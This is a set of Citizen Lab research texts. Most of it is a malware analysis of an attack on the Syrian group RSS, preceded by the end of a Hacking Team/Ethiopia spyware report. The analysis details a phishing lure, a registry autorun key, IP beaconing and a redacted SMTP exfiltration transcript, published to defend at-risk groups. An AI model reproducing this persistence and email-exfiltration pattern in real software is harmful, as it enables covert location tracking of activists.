2014 — Citizen Lab and Washington Post reveal that ESAT journalists in the US and Belgium were targeted with what appears to be Hacking Team spyware\nBetween approximately February 12 – 17, 2014, and March 25 – 31, 2014 — We observe no activity on the Ethiopian Hacking Team infrastructure\nBetween April 7, 2014 – April 16, 2014 — Ethiopia’s Hacking Team servers apparently get an update56\nNovember 5, 2014 — ESAT journalists targeted with what appears to be Hacking Team spyware\nNovember 10, 2014 — ESAT journalists targeted with what appears to be Hacking Team spyware\nDecember 19, 2014 — ESAT journalists targeted with what appears to be Hacking Team spyware\n\n\n \nConclusion\nDissidents and others fleeing repressive regimes have long found a degree of protection by seeking refugee status in the West. Throughout the 20th century refugees from political persecution have established thriving diaspora communities where they have been able to continue their activity without fear of physical persecution. For at least as long, the security services from the countries they left have attempted to monitor and sometimes interfere with their activities.\nWe have documented a year-long campaign of spyware attacks against journalists at ESAT, using what appears to be Hacking Team’s RCS spyware. Many of the journalists targeted in these attacks are legally considered US persons, and located in the US.\nIn its customer policy, Hacking Team notes:\n“[I]n HT contracts, we require customers to abide by applicable law. We reserve the right in our contracts to suspend support for our software if we find terms of our contracts are violated. If we suspend support for HT technology, the product soon becomes useless.”We will refuse to provide or we will stop supporting our technologies to governments or government agencies . . . who refuse to agree to or comply with provisions in our contracts that describe intended use of HT software, or who refuse to sign contracts that include requirements that HT software be used lawfully.”57\nThe policy suggests that Hacking Team will cease support for its technology when a client violates terms of its contract by failing to abide by applicable law. The lawfulness of government targeting of individuals based in the US with spyware, however, is in question; for example, a lawsuit brought by a US citizen against the government of Ethiopia in February 2014 claims that such actions violated the US Wiretap Act [18 U.S. Code § 2511(1)( a )].58\nHacking Team has also publicly stated that they investigate abuses reported in the press and sometimes take action:\n“… we have investigated cases either discovered internally or reported in the press that suggest abuse. We can and have taken action in such cases, however, we consider the results of our investigations and the actions we take based on them to be confidential.”59\nOur 2014 report documenting the abusive use of RCS against journalists received widespread media coverage, and both the Washington Post60 and Human Rights Watch61 corresponded with Hacking Team about our findings, and received specific responses.\nIn the wake of our 2014 reporting, we also sent an August 2014 open letter to Hacking Team, which inquired, inter alia, about investigation by the company into the reported misuse of the software against Ethiopian journalists in the United States.62 We posed further questions about their due diligence and accountability mechanisms, while applauding their efforts to incorporate human rights considerations into their customer policy. We have yet to receive a reply to this letter.\nDespite the aforementioned public reports and correspondence, this report shows that the same attacker appeared to be receiving updated versions of the RCS spyware from Hacking Team as recently as November 2014.\nCitizen Lab is sending an open letter to Hacking Team, providing a copy of this report and highlighting our reasons for concern from these latest findings. Hacking Team has recently announced that it is “complying fully”63 with export controls adopted within the framework of the Wassenaar Arrangement, which includes language covering “intrusion software.”\nStill, our findings suggest continued reasons for concern about the effectiveness of the mechanisms Hacking Team has in place to ensure respect for human rights in the use of their products.\nAcknowledgements\nThanks to ESAT, Irene Poetranto, Adam Senft, the Electronic Frontier Foundation, and Nicholas Weaver.\n \nFootnotes\n1 Bill Marczak, Claudio Guarnieri, Morgan Marquis-Boire, and John Scott-Railton, “Hacking Team and the Targeting of Ethiopian Journalists,” Citizen Lab, February 12, 2014, https://citizenlab.org/2014/02/hacking-team-targeting-ethiopian-journalists/.\n2 http://www.insa.gov.et/.\n3 Hacking Team, “Customer Policy,” http://www.hackingteam.it/index.php/customer-policy.\n4 Citizen Lab, 2014, “Open Letter to Hacking Team,” https://citizenlab.org/2014/08/open-letter-hacking-team/.\n5 Hacking Team, “The Solution,” http://www.hackingteam.it/index.php/remote-control-system.\n6 Bill Marczak, Claudio Guarnieri, Morgan Marquis-Boire, and John Scott-Railton, “Hacking Team and the Targeting of Ethiopian Journalists,” Citizen Lab, February 12, 2014, https://citizenlab.org/2014/02/hacking-team-targeting-ethiopian-journalists/.\n7 Hacking Team, “About Us,” http://www.hackingteam.it/index.php/about-us\n8 Hacking Team, “Customer Policy,” http://www.hackingteam.it/index.php/customer-policy\n9 Id.\n10 Craig Timberg, “Spyware lets regimes target U.S.-based journalists,” Washington Post, February 13, 2014, http://www.washingtonpost.com/wp-srv/tablet/20140213/A01_SU_EZ_DAILY_20140213.pdf.\n11 Craig Timberg, “Foreign regimes use spyware against journalists, even in U.S.,” Washington Post, February 12, 2014, http://www.washingtonpost.com/business/technology/foreign-regimes-use-spyware-against-journalists-even-in-us/2014/02/12/9501a20e-9043-11e3-84e1-27626c5ef5fb_story.html.\n12 Human Rights Watch, “The Know Everything We Do – Appendix 2: Correspondance,” March 25, 2014, http://www.hrw.org/node/123976/section/12.\n13 Citizen Lab, 2014, “Open Letter to Hacking Team,” https://citizenlab.org/2014/08/open-letter-hacking-team/.\n14 http://ethsat.com.\n15 Id.\n16 “ESAT Accuses China of Complicity in Jamming Signals,” Ethiopian Satellite Television, June 15, 2011, accessed February 13, 2014, http://ethsat.com/2011/10/08/esat-accuses-china-of-complicity-in-jamming-signals.\n17 “UDJ Says Expressing Opinion to Media is Not ‘Terror’,” Ethiopian Satellite Television, January 9, 2013, accessed February 13, 2014, http://ethsat.com/2014/01/09/udj-says-expressing-opinion-to-media-is-not-terror.\n18 Craig Timberg, “Foreign regimes use spyware against journalists, even in U.S.,” Washington Post, February 12, 2014, http://www.washingtonpost.com/business/technology/foreign-regimes-use-spyware-against-journalists-even-in-us/2014/02/12/9501a20e-9043-11e3-84e1-27626c5ef5fb_story.html.\n19 Id.\n20 “Ethiopia Arrests 2 Journalists From Independent Paper,” Committee to Protect Journalists, November 5, 2013, accessed February 13, 2014, http://www.cpj.org/2013/11/ethiopia-arrests-2-journalists-from-independent-pa.php.\n21 “Ethiopia,” Human Rights Watch, accessed February 13, 2014, http://www.hrw.org/world-report/2013/country-chapters/ethiopia.\n22 “They Want a Confession,” Human Rights Watch, October 17, 2013, accessed February 13, 2014, http://www.hrw.org/node/119814/section/2.\n23 Malware Tracker Blog, “Tomato Garden Campaign: Part 2 – An Old “New” Exploit,” June 7, 2013, http://blog.malwaretracker.com/2013/06/tomato-garden-campaign-part-2-old-new.html.

    "text": "\n\t\t\t\tMedia coverage: The New York Times, Security Week, Dark Reading, Forbes.\nCitizen Lab Research Fellow John Scott-Railton is one of the authors of a report entitled “Behind the Syrian Conflict’s Digital Frontlines,” released today by FireEye, that documents a hacking operation that successfully breached the Syrian opposition. The report describes the diverse malware tools–both widely available and custom malware–used by the threat actors, including the DarkComet RAT, a customized keylogger, Android malware, and tools with different shellcode payloads. The report’s other author, Nart Villeneuve, is a member of the Citizen Lab’s Technical Advisory Board.\nIn December 2014, John Scott-Railton and Senior Security Researcher Seth Hardy published a report documenting a malware attack against a Syrian citizen media group critical of Islamic State of Iraq and Syria (ISIS), Raqqah is being Slaughtered Silently, which was designed to unmask their location. Scott-Railton and Hardy provided circumstantial links of the attack to the Islamic State in Iraq and Syria.\nExcerpt:\n“Between at least November 2013 and January 2014, the hackers stole a cache of critical documents and Skype conversations revealing the Syrian opposition’s strategy, tactical battle plans, supply needs, and troves of personal information and chat sessions. This data belonged to the men fighting against Syrian President Bashar al-Assad’s forces, as well as media activists, humanitarian aid workers, and others within the opposition located in Syria, the region and beyond.\n“To undertake this operation, the threat group employed a familiar tactic: ensnaring its victims through conversations with seemingly sympathetic and attractive women. A female avatar would strike up a conversation on Skype and share a personal photo with her target. The photo was not only malware-laden but likely tailored to the victim’s device—an Android phone or a computer. Once the target downloaded the malware, the threat group accessed his device, rifled through files and selected and stole data identifying opposition members, their Skype chat logs and contacts, and scores of documents that shed valuable insight into the opposition.”\nRead the full report [PDF].\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tDownload PDF version\nby John Scott-Railton and Seth Hardy, in collaboration with Cyber Arabs.\nAvailable in Arabic on Cyber Arabs’ website: هجوم خبيث يستهدف سوريين ينتقدون “داعش”‎\nMedia coverage: Associated Press, CNN, The Guardian, BBC, Forbes, CBC News, Metro News, The Daily Beast, The Register, Pando Daily, Schneier on Security, Ars Technica, IB Times, France24, GMW.cn, CIO Today, SC Magazine, VOA News, HackRead, Mashable.\nSummary\nThis report describes a malware attack with circumstantial links to the Islamic State in Iraq and Syria. In the interest of highlighting a developing threat, this post analyzes the attack and provides a list of Indicators of Compromise.\nA Syrian citizen media group critical of Islamic State of Iraq and Syria (ISIS) was recently targeted in a customized digital attack designed to unmask their location. The Syrian group, Raqqah is being Slaughtered Silently (RSS), focuses its advocacy on documenting human rights abuses by ISIS elements occupying the city of Ar-Raqah. In response, ISIS forces in the city have reportedly targeted the group with house raids, kidnappings, and an alleged assassination. The group also faces online threats from ISIS and its supporters, including taunts that ISIS is spying on the group.\nThough we are unable to conclusively attribute the attack to ISIS or its supporters, a link to ISIS is plausible. The malware used in the attack differs substantially from campaigns linked to the Syrian regime, and the attack is focused against a group that is an active target of ISIS forces.\nBackground: Citizen Journalists under Threat in ISIS-controlled Territories\nAs the Syrian Civil War continues, Syrian citizen journalists and nonviolent activists operate in an increasingly unsafe environment. The regime has never welcomed their work, and has often targeted them for arrest and detention, and a multi-year hacking campaign (see Pro-Regime / Regime Linked Groups). Additionally, not all elements of the Syrian opposition have uniformly supported nonviolent activists and citizen journalists. More recently, in areas like Raqqah, nonviolent activists face a new and exceptionally grave threat: ISIS. A growing number of reports suggest that ISIS is systematically targeting groups that document atrocities, or that communicate with Western media and aid organizations, sometimes under the pretext of finding “spies”.1\nMap: Raqqah is indicated by the red arrow. Colors indicate areas mostly under the control of the following groups: Black = ISIS, Red = Syrian Regime, Green = Free Syrian Army, Yellow = Kurdish. Note: the map is not highly detailed, nor completely up-to-date, but is useful in showing general areas of control. Source: @DeSyracuse\n \nAr-Raqqah, the city in which the case study is located, is situated in northern Syria and continues to be a key conflict flashpoint of the Syrian Civil War. In the spring of 2013, Islamists and Free Syrian Army (FSA) fighters took over Ar-Raqqah from regime forces. As ISIS gained momentum, they consolidated their control over the city, edging out FSA-affiliated groups through attacks, summary executions, and kidnappings against a range of groups, including ethnic and religious minorities.\nInformation Control by ISIS\nDuring 2014, there were a number of reports—many unconfirmed—that ISIS confiscated smartphones and laptops from captured activists. According to Syrians who experienced these searches and spoke with one of the reports’ authors, ISIS sometimes extracts data from confiscated smartphones and laptops to collect information about people and groups they are targeting, as well as to seek evidence of “un-Islamic” activities.\nAs ISIS cements their control of Ar-Raqqah and other territories, reports have emerged recently (though not all of them confirmed) suggesting that elements within ISIS are growing increasingly sophisticated at imposing control and targeting opponents using digital methods. Reports about ISIS targeting Internet cafés2 have grown increasingly common, and in some cases reports point to the possible use of keyloggers as well as unspecified “IP sniffers” to track behaviour in Internet cafes.3\nThe Situation of Nonviolent Activists and Citizen Journalists in Ar-Raqqah\nNonviolent activists and citizen journalists based in Ar-Raqqah have provided the outside world with much of what we know about how ISIS treats the population. These activists and journalists face mortal danger for their actions, and reports have emerged of their detention and torture at the hands of ISIS.4\nAs ISIS continues to use social media to push the message that it is welcomed by the population of Ar-Raqqah, groups like Raqqah is being Slaughtered Silently (RSS)5 provide a compelling counter narrative. RSS hasn’t escaped ISIS’ notice, and the group has been targeted for kidnappings, house raids, and at least one alleged targeted killing. At the time of writing, ISIS is allegedly holding several citizen journalists in Ar-Raqqah.\nImage 1: Example of an online threat made against RSS. The image, which cannot be confirmed, purports to show CCTV installed around Raqqah.\nIn addition, RSS is targeted online by ISIS supporters with harassment, including threats to the physical safety of its members. For example, ISIS supporters have claimed that ISIS has established a system of CCTV cameras in Ar-Raqqah to observe residents’ movements. While this claim may be a bluff or exaggeration, at least one ISIS supporter has indicated on social media that this system could be used to look for members of RSS.\nAnalyzing the Attack\nThis section describes a highly targeted attack sent to an e-mail address belonging to RSS. The Citizen Lab analyzed this attack with the consent of RSS, which requested that their name be used in this report.\nThe attack took the form of an unsolicited e-mail containing a download link to a decoy file. The file contained custom malware that profiled the victim’s computer and beaconed its IP address to an e-mail account under the attacker’s control.\nThe Targeting of RSS\nThe unsolicited message below was sent to RSS at the end of November 2014 from a Gmail email address. The message was carefully worded, and contained references specific to the work and interests of RSS.\nTargeting Email6\nThank you for your efforts to deliver a true picture of the reality of life in Raqqah.  As Syrians residing in Canada we are working with media because we believe in the importance of shedding light on the realities of life in Syria, and Raqqah in particular. We are preparing a lengthy news report on the realities of life in Raqqah. We are sharing some information with you with the hope that you will correct it in case it contains errors. We have prepared a map of the city of Raqqah, in addition to a preliminary report. We hope that you have a look at it with them and inform us of any errors. We also hope that if you happen to be on Facebook, you could provide us with the account of the person responsible for the campaign, if you don’t mind, so that we can communicate with him directly.\nYou can see a preliminary copy of the report on this linkhttp://tempsend [DOT]com/[Redacted]With all respect\n[Name Redacted]\nOriginal Arabic\nتحية طيبة ..\nبعد الشكر لجهودكم المقدمة لإيصال الصورة الحقيقية لواقع الحياه في الرقة , وايماناً منا كسوريين مقيمين في كندا نعمل في مجال الاعلام بضروره المساهمه في تسليط الضوء على واقع الحياه في سوريا بشكل عام والرقه بشكل خاص , فإننا نقوم بإعداد تقرير صحفي مطول حول واقع الحياه في الرقه .\nولذلك قمنا بالتواصل معكم لتصحيح بعض المعلومات التي لدينا في حال كانت خاطئة , حيث قمنا بإعداد خريطة لمدينة الرقة بالاضافه الى تقرير مبدءي نرجوا منكم الإطلاع عليها وإقادتنا بأي خطاء , كما نرجوا منكم في حال تواجدكم على الفيس بوك بتزويدنا بحساب احد القائمين على الحمله في حال لم يكن لديكم مانع من ذلك , ليتم التواصل معه بشكل مباشريمكنكم الاطلاع على النسخه المبدئية للتقرير على الرابط التاليhttp://tempsend [DOT]com/[Redacted]مع كل التقدير\n[Name Redacted]\nWe are unsure why the attacker specifically mentions Canada in the email lure. However, it is well known that Syria’s extensive diaspora (including in Canada) regularly engages in advocacy, sometimes in coordination with groups within Syria. Thus, the message is not on its face implausible. However, we note that the attacker also attempts to social engineer the identity of individuals working with RSS, by requesting a personal Facebook page.\nAnalyzing the Malware\nThe custom malware used in this attack infects a user who views the decoy “slideshow,” and beacons home with the IP address of the victim’s computer and details about his or her system each time the computer restarts.\nUnlike Syrian regime-linked malware, it contains no Remote Access Trojan (RAT) functionality, suggesting it is intended for identifying and locating a target. \nFurther, because the malware sends data captured by the malware to an e-mail address, it does not require that the attackers maintain a command-and-control server online. This functionality would be especially useful to an adversary unsure of whether it can maintain uninterrupted Internet connectivity.\nNarrative of Infection\nAccessing the link provided in the malicious e-mail sends the user to a .zip file hosted on file-sharing site tempsend.com. At the time of writing the file had been downloaded only 10 times\nImage 2: Tempsend screenshot\nThe file to be downloaded is “slideshow.zip”\nMD5: b72e6678e79cc57d33e684528b5721bd\nThis file contains slideshow.exe\nMD5: f8bfb82aa92ea6a8e4e0b378781b3859\nThis file is a self-extracting archive with an icon intended to suggest to the victim that it is itself a slideshow.\n\nWhen run, the file opens a slideshow of Google Earth screen captures to the victim, displaying a series of locations in Syria, and highlighting an “ISIS HQ” and other images showing the alleged locations of US airstrikes.\nExamples of images in the slideshow as follows:\n\n\n\nInfection and Data Collection\nWhen opened, the “slideshow.zip” file writes and executes several files:\nC:\\Users\\[Username]\\AppData\\Local\\Temp\\IXP000.TMP\\AdobeR1.exe\nC:\\Users\\[Username]\\AppData\\Local\\Temp\\IXP000.TMP\\pictures.exe\n“AdobeR1.exe” is malicious, while “pictures.exe” is the genuine slideshow displayed to the victim. When the slideshow is closed both AdobeR1.exe and pictures.exe are deleted.\nThe AdobeR1 file writes a series of executable files that perform information collection and communication functions, including:\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\AdbrRader.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\AdobeIns.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\GoogleUpate.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\GooglUpd.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvidrv.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvisdvr.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\rundl132.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\svhosts.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvidrv.exe\nProgram Sequence\nThe program sequence of data collection and sending is somewhat unusual, with each program performing a single task and communicating via markers left in the registry. Programs appear to make use of the Visual C++ Runtime Library.\nFirst, the program nvidrv adds itself to autorun:\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run under name “UpdAdbreader”\nIt also creates a series of registry keys that the individual programs use to communicate:\nRegistry keys and programs using them:\nrundl132.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K6F-DKV8J-FKVJI-GVKBU\\6nvisdvr.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K4F-DKV8J-FKVJI-GVKBU\\4GoogleUpate.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K3F-DKV8J-FKVJI-GVKBU\\3AdbrRader.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K2F-DKV8J-FKVJI-GVKBU\\2nvidrv.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K1F-DKV8J-FKVJI-GVKBU\\1\nSets name “1” to StartupInfo structure as a string, e.g. “0x3110x611”\nIt then runs GooglUpd, which cleans up the program files if they exist, and runs AdbrRader. AdbrRader (communicating through registry key “2”) writes the file vgadmysadm.tmp with the name of another registry key “2” with startup info.\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\ vgadmysadm.tmp\nNext, nvidrv runs GoogleUpate, which collects system information and writes it to:\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\vg2sxoysinf.tmp\nThen nvidrv runs nvisdvr (registry key “4”) that collects a list of running processes, which are written to:\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\v2cgplst.tmp\nFinally, nvidrv runs svhosts, which tests Internet connectivity by doing a DNS query for windowsupdate.microsoft.com. It then runs rundl132 if it has not before, by checking whether registry key name “6” is present. It sets the key to “0” and runs it.\nNext, “rundl132.exe” performs an HTTP GET request to myexternalip.com and collects the external IP of the infected machine:\nGET /raw HTTP/1.1\nHost: myexternalip.com\nCache-Control: no-cacheHTTP/1.1 200 OK\nServer: nginx/1.6.2\nContent-Type: text/html; charset=utf-8\nTransfer-Encoding: chunked\nConnection: close\nDate: [REDACTED]\nMy-External-Ip: [REDACTED]f\n[REDACTED]0\nNext, rundl132 writes:\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\Q7B90TFG\\raw[1].txt\nThen rundl132 writes the external IP to:\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\vgosysaext.tmp\nFinally, rundl132 runs AdobeIns, which zips the contents of the win32.tmp folder.\nProgram “AdobeIns.exe” takes the files written by the other programs and zips them in an encrypted, password-protected file:\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\drv.sys\\mxtd\nData Transmission\nData is transmitted by e-mail to an account presumably controlled by the attacker.\nAdobeIns connects to an account at the online e-mail provider inbox.com via smtp using hardcoded credentials. The malware then sends an e-mail to the same inbox containing the text “Hello” and with mxtd file attached.\nSMTP traffic generated by the malware to inbox.com (with redactions)\n220 [REDACTED]ESMTP Postfix\nEHLO [REDACTED]\n250-[REDACTED]\n250-PIPELINING\n250-SIZE 10240000\n250-VRFY\n250-ETRN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250 DSN\nMAIL FROM:< [REDACTED]@inbox.com>\n250 2.1.0 Ok\nRCPT TO:< [REDACTED]@inbox.com>\n250 2.1.5 Ok\nDATA\n354 End data with .\nDate: [REDACTED]\nFrom: <[REDACTED]@inbox.com>\nX-Priority: 3 (Normal)\nTo: <[REDACTED]@inbox.com>\nSubject: repo\nMIME-Version: 1.0\nContent-Type: multipart/mixed; boundary=”__MESSAGE__ID__[REDACTED]”–__MESSAGE__ID__[REDACTED]\nContent-type: text/plain; charset=US-ASCII\nContent-Transfer-Encoding: 7bitHello\n–__MESSAGE__ID__[REDACTED]\nContent-Type: application/x-msdownload; name=”mxtd”\nContent-Transfer-Encoding: base64\nContent-Disposition: attachment; filename=”mxtd”[REDACTED]–__MESSAGE__ID__[REDACTED]–.\n250 2.0.0 Ok: queued as [REDACTED]\nQUIT\n221 2.0.0 Bye\nEvaluation of the Malware’s Functionality\nThe malware seen in this case study is unusual as it relies on a half-dozen separate executable files, each with a single task, and each communicating via markers dropped in the Registry.\nThe malware is also interesting because it does not provide remote access, but only sends an e-mail containing the victim’s IP address and miscellaneous system information. The malware resends the information each time the computer is restarted, but it does not refresh the sent information on restart (which may be a bug). This behaviour strongly suggests that the function of this malware is to serve as a beacon. The system information could be used to identify processes to exploit in the future, however since the attacker has already triggered the execution of a file on the victim’s system, it is surprising that more was not taken, or that a RAT (custom or widely available) was not used. A RAT would have provided much greater access alongside IP information\nBy not providing remote access and other RAT functionality, the program looks less like malware, and may attract less attention from endpoint protection tools and scanners. Detections were low when the file was first submitted to VirusTotal, for example. It registered only 6/55 detections by anti virus scanners, or a 10% detection rate.7\nTransmitting the malware via e-mail also provides a degree of obscurity, and has the additional advantage of providing a layer of abstraction between the attacker and the target: there is no need to maintain a RAT command-and-control server. The malware transmits autonomously, leaving the material in an inbox for the attacker to collect at a later time.\nThe malware has no obfuscation processes and is not highly technical in its development or interaction with Windows. Nevertheless, we believe that the author of the program is aware of certain techniques to reduce the visibility of malware on a network, including transmitting data via encrypted e-mail communications. However, the attacker has not correctly implemented encrypted e-mail: the malware will not attempt to use a TLS connection in certain cases. As a result, account login credentials may be readily available in network traffic.\nIn addition, the malware uses the old PKWARE implementation of zip encryption, which is not particularly secure. The password for the zipped file is also present in the binary without encryption or obfuscation.\n\nTargeted Threats Index\nCitizen Lab researchers have developed the Targeted Threat Index (TTI) as a tool to standardize information about the sophistication of targeted threats against civil society groups in our research. The index captures information about the level of social engineering used (“Targeting Sophistication”), and adds a Technical Sophistication value for the attack as a multiplier.\nThis attack, which has little technical sophistication (i.e., it uses no exploits, code obfuscation, or techniques to frustrate reversing, etc.), nevertheless has carefully developed social engineering in the seeding materials and bait document. Taken together it rates a 3 for Targeting Sophistication and a 1.25 for Technical Sophistication by our metric, yielding a TTI score of 3.75. Citizen Lab research using the TTI has found that, despite low levels of technical sophistication, with well-crafted social engineering malware attacks remain highly effective against civil society groups. More information is available about the TTI in a recent Usenix Security paper.8\n\nAttribution\nThere are at least three possible sources for this malware attack:\n\nPro-regime / regime-linked malware groups\nISIS-linked hackers\nOther, unknown actors\n\nWe evaluate each of these possibilities in turn, drawing on the information available to us after almost three years of tracking regime-linked malware.\n\nPro-Regime / Regime-Linked Groups\nPro-regime malware actors have continually targeted the Syrian opposition with waves of malware since at least late 2011. Those campaigns have been extensively reported on by a range of groups, including Kaspersky,9 FireEye,10 Citizen Lab,11 the Electronic Frontier Foundation,12 and many others. Regime-linked malware has a number of common features that typically serve as distinguishing characteristics:\n\nSocial engineering focusing on the needs and interests of the opposition. Although targeted, the malware seeding often aims at classes of people (e.g., people interested in ‘shocking’ news about a fighter, or ‘leaked’ information about the Assad regime) rather than carefully written spear phishing targeting a single individual or small group.\nUse of widely available RATs (njRAT, Xtreme Rat, ShadowTech Rat, DarkComet RAT, and Blackshades RAT, among others).\nAt least one command-and-control server located within Syrian IP space (often from a limited range of addresses).\nFrequent use of Dynamic DNS providers like no-ip.\nUse of “crypters” to obscure the binary.\n\nThese characteristics are not all present in every sample, but we have typically found one or more in almost every binary we have examined that is Syrian regime-linked.\nThis malware attack differs from known regime-linked groups in each of these elements. Not only is it exceptionally targeted, but it is also not a commonly available RAT. Nor does it have RAT functionality. The function of the malware appears to be: identify and unmask the IP address of target(s), and resend them to the attacker with each reboot. In addition, data is sent to an Internet e-mail address, and no crypter is used to obscure the binary.\nWe are aware of only one previous case in Syria in which e-mail was used to transmit data, and that we believed was regime linked. That incident, observed in 2012, also used hardcoded e-mail to exfiltrate. However, that malware had substantially more functionality than this case: not only did it drop a second stage from a compromised site, but it also included a mechanism for exfiltrating credentials from Facebook and hooking programs like Skype.\nThe lack of overlap in Tactics, Techniques, and Procedures (TTPs) between this attack and prior attacks does not rule out Syrian regime-linked attackers. It is possible that regime-linked groups are trying a new approach. However, given that known regime-linked groups continued to remain active during the same date range using familiar TTPs, this scenario seems unlikely. In addition, it would be strange for regime-linked malware groups to undertake significant effort to prepare and send an implant that has significantly less functionality than what they commonly use. Taken together, we find this evidence supports the hypothesis that familiar regime-linked groups did not conduct the attack.\nISIS-linked Hackers\nRSS operates in territory controlled by ISIS, and has faced extensive targeting by ISIS. Currently, they appear to be directly targeted by ISIS for kidnappings and other retaliation, including executions. In addition, ISIS supporters have explicitly suggested that the group is under surveillance and actively hunted. Together this evidence suggests that ISIS has a strong motivation for using social engineering and/or malware to locate the members of RSS.\nWe think there are several features of the malware attack that align with the needs and constraints of ISIS and its supporters in Ar-Raqqah, more so than other groups, as we understand them. For example:\n\nThe malware beacons location but does not provide RAT functionality.\nThe seeding attempts to obtain a ‘private’ Facebook identity from RSS through social engineering.\nThe malware exfiltrates to an online e-mail account, thus not requiring the attacker to maintain a command-and-control server online.\n\nThe social media activity of members of RSS is often highly public. Their location and exact membership, however, is secret. We speculate that if an attacker were interested in maintaining long-term surveillance of the activities of RSS they could have employed a RAT. However, if the attacker were interested in unmasking the location of its targets so they could be physically tracked down, collecting IP data and system info would be a more reasonable approach.\nISIS or its supporters clearly have a strong interest in the (rudimentary) location tracking of the members of RSS that this malware provides. Internet connectivity in Raqqah is extremely limited, and some of it is under ISIS control. Knowing the IP address of a target could quickly narrow down targets to specific locations, and specific Internet services, or Internet cafes in Raqqah. Given that the identities and locations of RSS members are closely guarded, such information would hold significant intelligence value for ISIS. Armed with this kind of information, ISIS could physically harm people within Raqqah (and it is also possible that they have the ability to operate in some capacity in border areas of Turkey).\nLittle is publicly known about the technical capabilities of ISIS and its supporters; however, reports have begun to emerge suggesting that ISIS is interested in expanding its abilities. In addition, ISIS has reportedly gained the support of at least one individual13 with some experience with social engineering and hacking: Junaid Hussain (aka TriCk), a former member of teamp0ison hacking team.14 While Mr. Hussain and associates have reportedly made threats against Western governments, it is possible that he or others working with ISIS have quietly supported an effort to identify the targeted organization, which is a highly visible thorn in the side of ISIS.\nOther Unknown Actors\nIt is possible that the attack is the product of actors working for unknown purposes and targeting RSS. Given the activities of RSS, however, it is unclear who this might be. It is not possible, for example, to reject the theory that some unknown group within the FSA, or other groups opposing the Assad regime are responsible. Citizen journalists in Ar-Raqqah were previously critical of arbitrary arrests carried out by non-ISIS groups in 2013. However, it is unclear why those groups, which no longer control Ar-Raqqah, would be interested in RSS in November 2014.\nIt is likely that third party actors, including several intelligence services, are closely monitoring various actors in the conflict through a range of electronic means. However, there is little reason to suggest that they would use a tailored but technically rudimentary attack to target RSS in particular.\nConclusion: ISIS Can’t Be Ruled Out\nAfter considering each possibility, we find strong but inconclusive circumstantial evidence to support a link to ISIS. However, we are unable to connect this attack directly to ISIS, Mr. Hussain, or other ISIS supporters. If indeed ISIS or its supporters are responsible, it seems reasonable that such an offensive capability may still be in development.\nWe hope that publishing this report will draw attention to a new and concerning threat that includes ISIS critics among its targets. If ISIS is responsible, while this attack targets in-country impediments to ISIS objectives, other targets may include ideological or military adversaries abroad.\nWhether or not ISIS is responsible, this attack is likely the work of a non-regime threat actor who may be just beginning to field a still-rudimentary capability in the Syrian conflict. The entry costs for engaging in malware attacks in a conflict like the Syrian Civil War are low, and made lower by the fact that the rule of law is nonexistent for large parts of the country. In still other parts (under regime control), malware attacks appear to be state sanctioned.\nAttacks Targeting Civil Society\nCitizen Lab research into targeted digital threats against civil society confirms that civil society groups face grave threats from targeted malware attacks, despite being under-resourced to defend against them.15 The case highlighted here is no exception: lack of IT and security resources have made it difficult for the Syrian opposition to address targeted and persistent digital threats against them. In addition, if ISIS is indeed responsible, this case suggests how easy it is for belligerents in a conflict to begin fielding basic offensive digital capabilities, and how quickly the capabilities can be pointed at unarmed civil society groups.\nWarning: Social Engineering Thrives in Syrian Context\nThis attack was exceptionally targeted, and clearly reflected the work of an actor familiar with the operations of the targeted organization. As most organizations working on issues surrounding Syria are aware, malware delivered with good social engineering is a constant source of danger.\nThis particular attack can be prevented by not opening files sent by unknown persons. However, many attacks in Syria come from hijacked accounts and impersonate people known to the targets. Social engineering remains an unsolved problem, and continues to compromise groups throughout the Syrian opposition and their supporters.\nThis attack reaffirms the dangers posed by social engineering attacks, whether they deliver phishing campaigns or malware. The circumstantial evidence of ISIS involvement suggests that groups working on topics that ISIS considers a threat, and their partner organizations and supporters, should urgently examine their security policies and assess the possible risks to their operations, and the consequences of exposure of sensitive information to ISIS. Even if the link to ISIS turns out to be incorrect, it is possible that this will be a threat in the future.\nIndividuals and groups at risk can also consult materials in Arabic provided by Cyber Arabs including a series of very accessible videos on digital security.\nIndicators of Compromise\nThe malware files\n\n\n\nFilename\nMD5\n\n\nslideshow.zip\nb72e6678e79cc57d33e684528b5721bd\n\n\nslideshow.exe\nf8bfb82aa92ea6a8e4e0b378781b3859\n\n\n\nFiles dropped by the malware\n\n\n\nFilename and 